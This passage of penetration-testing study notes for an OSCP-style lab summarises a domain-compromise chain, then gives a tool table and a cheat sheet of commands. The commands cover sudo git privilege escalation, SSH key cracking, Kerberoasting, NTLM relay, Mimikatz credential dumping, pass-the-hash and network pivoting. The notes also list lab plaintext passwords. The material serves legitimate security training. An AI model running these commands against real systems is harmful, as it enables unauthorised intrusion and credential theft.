  ↓
NTLM relay to MAILSRV1 → SYSTEM
  ↓
Mimikatz → Beccy Domain Admin credentials
  ↓
PsExec/pass-the-hash → DCSRV1 SYSTEM
```

### Major lessons

- **Map the entire attack surface.** You cannot attack services you never discovered.
- **Do not stop enumeration after finding one exploit.** Later information may produce a better chain.
- **Re-enumerate with higher privileges.** Root/SYSTEM unlocks more files, secrets, sessions, and credentials.
- **Preserve artifacts and timestamps.** Good notes make both exploitation and reporting easier.
- **Combine cross-host evidence.** The successful chain depends on correlations: a Git credential found on WEBSRV1, a session found with BloodHound, an SPN pointing to an internal web app, SMB-signing state, and a WordPress plugin capable of causing authentication.
- **Clean up after the engagement.** Remove tools, payloads, and exploit artifacts or clearly notify the client where they remain.

---

# Attack Chain Connection

## `Recon → Enumeration → Initial Access → Privilege Escalation → Credentials → Pivoting → AD → Proof`

### Recon

- Client supplies initial public targets.
- Public pages, banners, and passive research establish likely technologies and attack surface.

### Enumeration

- Nmap maps exposed services.
- Gobuster checks hidden content.
- WhatWeb and source inspection identify WordPress.
- WPScan enumerates plugins and finds outdated Duplicator.
- Later, winPEAS/linPEAS, BloodHound, CrackMapExec, Nmap, DNS cache, and sessions deepen the picture.

### Initial Access

- Duplicator arbitrary file read exposes Daniela’s SSH private key.
- `ssh2john` + John recover the key passphrase.
- SSH gives a shell on WEBSRV1.
- Later phishing gives an internal foothold on CLIENTWK1.

### Privilege Escalation

- linPEAS identifies `NOPASSWD: /usr/bin/git`.
- Git invokes a privileged pager; `!/bin/bash` yields root.
- NTLM relay later gives SYSTEM on MAILSRV1.

### Credentials

- `wp-config.php` exposes `DanielKeyboard3311`.
- Git history exposes `john:dqsTwTpZPn#nL`.
- Kerberoasting exposes `daniela:DANIelaRO123`.
- Mimikatz extracts Beccy’s plaintext password and NTLM hash.

### Pivoting

- CLIENTWK1 provides access to `172.16.6.0/24`.
- Meterpreter `autoroute` + SOCKS5 + Proxychains allow Kali tools to reach internal hosts.
- Chisel provides a stable browser-friendly reverse port forward to INTERNALSRV1.

### AD

- SharpHound/BloodHound identify computers, users, Domain Admins, sessions, and the Kerberoastable Daniela account.
- Beccy is identified as Domain Admin and has a session on MAILSRV1.
- Daniela’s SPN points to INTERNALSRV1, connecting AD data to the internal web application.

### Proof

- `impacket-psexec` with Beccy’s NTLM hash gets SYSTEM on `DCSRV1`.
- `whoami`, `hostname`, and `ipconfig` verify privileged control of the domain controller.

> [!success]
> The chapter demonstrates that OSCP-style success is often not “find one exploit.” It is **maintain a knowledge graph in your notes and repeatedly recombine findings until a complete path emerges**.

---

# Tool and Command Reference

| Tool / command | Role in this chapter | Key arguments / notes |
|---|---|---|
| `nmap` | External/internal port and service enumeration | `-sC`, `-sV`, `-sT`, `-Pn`, `-p`, `-oN` |
| `gobuster` | Web directory/file enumeration | `dir`, `-u`, `-w`, `-x`, `-o` |
| `whatweb` | Web technology fingerprinting | Target URL |
| `wpscan` | WordPress/component enumeration | `--url`, `--enumerate p`, `--plugins-detection aggressive`, `-o` |
| `searchsploit` | Search/copy/review Exploit-DB entries | query, `-x <id>`, `-m <id>` |
| `ssh2john` | Convert encrypted SSH key for John | `ssh2john id_rsa > ssh.hash` |
| `john` | Dictionary attack against SSH key hash | `--wordlist=...` |
| `linPEAS` | Linux local enumeration | Identify sudo, secrets, repos, interfaces |
| `GTFOBins` | Find abuse patterns for allowed binaries | Used for sudo Git pager escape |
| `git` | Inspect repo/history and abused for root | `status`, `log`, `show`, `-p help config` |
| `crackmapexec` | Credential validation and SMB enumeration | `smb`, `-u`, `-p`, `-d`, `--shares`, `--continue-on-success` |
| `wsgidav` | Host WebDAV share | `--host`, `--port`, `--auth`, `--root` |
| `powercat` | PowerShell reverse shell | `-c`, `-p`, `-e powershell` |
| `swaks` | Authenticated SMTP/phishing delivery | `-t`, `--from`, `--attach`, `--server`, `--body`, `--header`, `-ap` |
| `winPEAS` | Windows local enumeration | Validate critical output manually |
| `SharpHound` | Collect AD data for BloodHound | `Invoke-BloodHound -CollectionMethod All` |
| `BloodHound` | Analyze AD objects/relationships | Pre-built and custom Cypher queries |
| `msfvenom` | Generate Meterpreter payload | `-p`, `LHOST`, `LPORT`, `-f exe`, `-o` |
| Metasploit `multi/handler` | Receive Meterpreter callback | matching payload, `ExitOnSession false`, `run -j` |
| Metasploit `autoroute` | Add route through compromised host | `set session 1`, `run` |
| Metasploit `socks_proxy` | Expose internal route as SOCKS5 | `SRVHOST 127.0.0.1`, `VERSION 5` |
| `proxychains` | Route supported Kali tools through SOCKS | `-q` for quiet mode |
| `chisel` | Reverse port forwarding for browser access | server `--reverse`; client `R:local:host:port` |
| `impacket-GetUserSPNs` | Kerberoasting | `-request`, `-dc-ip` |
| `hashcat` | Crack TGS-REP hash | `-m 13100`, wordlist |
| `impacket-ntlmrelayx` | Relay forced NTLM auth | `--no-http-server`, `-smb2support`, `-t`, `-c` |
| `mimikatz` | Dump cached/logon credentials | `privilege::debug`, `sekurlsa::logonpasswords` |
| `impacket-psexec` | Lateral movement / pass-the-hash | `-hashes LMHASH:NTHASH user@target` |

---

# Mini Cheat Sheet — Chapter 24

> [!tip] Exam-side reminders
> These are the commands/ideas from this chapter that are most useful to have beside you while working a machine.

1. **Baseline scan + save it**
   ```bash
   sudo nmap -sC -sV -oN nmap <IP>
   ```

2. **Directory/file discovery**
   ```bash
   gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config
   ```

3. **Fingerprint + enumerate WordPress**
   ```bash
   whatweb http://<IP>
   wpscan --url http://<IP> --enumerate p --plugins-detection aggressive
   ```

4. **Search/review/copy an Exploit-DB PoC**
   ```bash
   searchsploit <product>
   searchsploit -x <EDB-ID>
   searchsploit -m <EDB-ID>
   ```

5. **If arbitrary file read exists, think users + keys + configs**
   ```text
   /etc/passwd
   /home/<user>/.ssh/id_rsa
   wp-config.php / app configs / scripts
   ```

6. **Crack an encrypted SSH key**
   ```bash
   ssh2john id_rsa > ssh.hash
   john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
   ```

7. **Always check sudo and GTFOBins**
   ```bash
   sudo -l
   ```
   For this chapter’s Git case:
   ```bash
   sudo git -p help config
   # then inside pager:
   !/bin/bash
   ```

8. **Git history may preserve deleted secrets**
   ```bash
   git status
   git log
   git show <commit>
   ```

9. **Validate reused credentials over SMB**
   ```bash
   crackmapexec smb <IP> -u users.txt -p passwords.txt --continue-on-success
   crackmapexec smb <IP> -u <user> -p '<pass>' --shares
   ```

10. **Internal situational awareness**
    ```powershell
    whoami
    hostname
    ipconfig
    systeminfo
    ```

11. **SharpHound collection**
    ```powershell
    powershell -ep bypass
    . .\SharpHound.ps1
    Invoke-BloodHound -CollectionMethod All
    ```

12. **BloodHound raw queries used here**
    ```cypher
    MATCH (m:Computer) RETURN m
    MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
    ```

13. **Meterpreter pivot → SOCKS5**
    ```text
    use multi/manage/autoroute
    set session 1
    run
    use auxiliary/server/socks_proxy
    set SRVHOST 127.0.0.1
    set VERSION 5
    run -j
    ```

14. **Proxychains setting**
    ```text
    socks5 127.0.0.1 1080
    ```

15. **Nmap through SOCKS must use connect scan**
    ```bash
    proxychains -q nmap -sT -Pn -p <ports> <internal-IP>
    ```

16. **Chisel reverse port forward**
    ```bash
    ./chisel server -p 8080 --reverse
    ```
    ```cmd
    chisel.exe client <KALI>:8080 R:<LOCALPORT>:<INTERNAL-IP>:<REMOTEPORT>
    ```

17. **Kerberoast**
    ```bash
    proxychains -q impacket-GetUserSPNs -request -dc-ip <DC-IP> <domain>/<user>
    hashcat -m 13100 <hashfile> /usr/share/wordlists/rockyou.txt
    ```

18. **Relay conditions to notice**
    ```text
    SMB signing disabled + ability to force authentication + reusable/privileged credentials
    ```

19. **Credential dumping after SYSTEM/admin**
    ```text
    privilege::debug
    sekurlsa::logonpasswords
    ```

20. **Pass-the-hash to a Windows target**
    ```bash
    proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:<NTHASH> <user>@<target>
    ```

---

# Final OSCP Mindset Checklist

- [ ] Enumerate every exposed service before committing to one exploit.
- [ ] Save scan output and credentials immediately.
- [ ] Treat source code, configs, Git history, scripts, and backup files as credential sources.
- [ ] Reuse discovered credentials carefully across relevant services.
- [ ] After foothold: enumerate OS, privileges, interfaces, routes, users, sessions, and secrets.
- [ ] After privilege escalation: enumerate again.
- [ ] In AD: identify users, computers, Domain Admins, sessions, SPNs, local-admin/RDP relationships, and SMB signing.
- [ ] When a host is dual-homed or has internal access, think **pivot**.
- [ ] Keep track of facts that are not immediately useful; they may combine into a later chain.
- [ ] Verify the final objective with `whoami`, `hostname`, network information, and required proof files/evidence for the exam/lab.

